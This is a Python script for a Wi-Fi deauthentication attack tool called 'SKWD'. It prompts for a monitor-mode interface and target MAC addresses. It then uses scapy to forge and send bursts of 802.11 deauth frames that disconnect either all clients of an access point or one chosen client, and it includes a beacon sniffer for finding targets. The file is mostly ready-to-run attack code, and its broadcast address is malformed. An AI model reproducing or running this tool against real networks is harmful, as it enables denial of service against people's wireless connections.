from scapy.all import *
import colors
interface = ''
client = '' 
accessPoint = ''

def wifiDeauthAP():
  
    
#getting the information from user, interface, client, and AP mac addresses
  interface = input(colors.green('Select your MONITOR MODE interface (ex. \"wlan0mon\")\nSKWD>'))
  print('OK, ' + interface)

  client = 'FF:FF:FF:FF:FF'

  accessPoint = input(colors.green('Input the Access Point\'s BSSID (MAC Address)\nSKWD>'))
  print('OK, ' + accessPoint)
  #From here, we print out the info, to make sure the info is correct than we start with deauth, or exit SKWD

  print('__________________________________________________')
  print('Just to be sure, here is are the current settings:\nMonitor Mode Interface:' + interface + '\nClient: All Clients\nAccess Point:' + accessPoint)
  print('__________________________________________________')
  
  correct = input('Is this correct? (y/n):\n?>')
  
  def deauthRouter():
    print('Building the packet.')
    #using scapy to craft anf send deauth packet, thanks Abdou Rockikz!
    dot11 = Dot11(addr1=client, addr2=accessPoint, addr3=accessPoint)
    # stack them up
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    print('Packet ready.')
    # send the packet
    print('Sending packets')
    sendp(packet, inter=0.1, count=200, iface=interface, verbose=1)

  if correct == 'y':
    print(colors.green('Alright. Starting Deauth...'))
    deauthRouter()
  elif correct == 'n':
    print('Exiting...')
    sys.exit()
   
def wifiDeauthClient():
  def deauthRouter():
    print('Building the packet.')
    #using scapy to craft anf send deauth packet, thanks Abdou Rockikz!
    dot11 = Dot11(addr1=client, addr2=accessPoint, addr3=accessPoint)
    # stack them up
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    print('Packet ready.')
    # send the packet
    print('Sending packets')
    sendp(packet, inter=0.1, count=200, iface=interface, verbose=1)

  #getting the information from user, interface, client, and AP mac addresses
  interface = input(colors.green('Select your MONITOR MODE interface (ex. \"wlan0mon\")\nSKWD>'))
  print('OK, ' + interface)

  client = input(colors.green('Input the client\'s BSSID (MAC Address)\nSKWD>'))
  print('OK, ' + client)

  accessPoint = input(colors.green('Input the Access Point\'s BSSID (MAC Address)\nSKWD>'))
  print('OK, ' + accessPoint)
  #From here, we print out the info, to make sure the info is correct than we start with deauth, or exit SKWD

  print('__________________________________________________')
  print('Just to be sure, here is are the current settings:\nMonitor Mode Interface:' + interface + '\nClient:' + client + '\nAccess Point:' + accessPoint)
  print('__________________________________________________')
  
  correct = input(colors.red('Is this correct? (y/n):\n?>'))
  def deauthClient():
    print('Building the packet.')
    #using scapy to craft anf send deauth packet, thanks Abdou Rockikz!
    dot11 = Dot11(addr1=client, addr2=accessPoint, addr3=accessPoint)
    # stack them up
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    print('Packet ready.')
    # send the packet
    print('Sending packets')
    sendp(packet, inter=0.1, count=200, iface=interface, verbose=1)

  if correct == 'y':
    print('Alright. Starting Deauth...')
    deauthClient()
  elif correct == 'n':
    print('Exiting...')
    sys.exit()

 
  
  #Feature coming soon, will be added to the above functions as one of the methods of selecting a target. -SK
def scanForTarget():
    interface = input('Input Your MONITOR MODE Interface\nSKWD>')
    ap_list = []

    def PacketHandler(packet):
      if packet.haslayer(Dot11):
          if packet.type == 0 and packet.subtype == 8:
              if packet.addr2 not in ap_list:
                  ap_list.append(packet.addr2)
                  print("MAC: %s SSID: %s " %(packet.addr2, packet.info))


    sniff(iface=interface, prn = PacketHandler)
  

  #Feature coming soon, checks whether or not a selected interface is in monitor mode, as it is required
  #to send deauth packets. -SK
def monitorModeCheck():
  print('test, monitorModeCheck.')
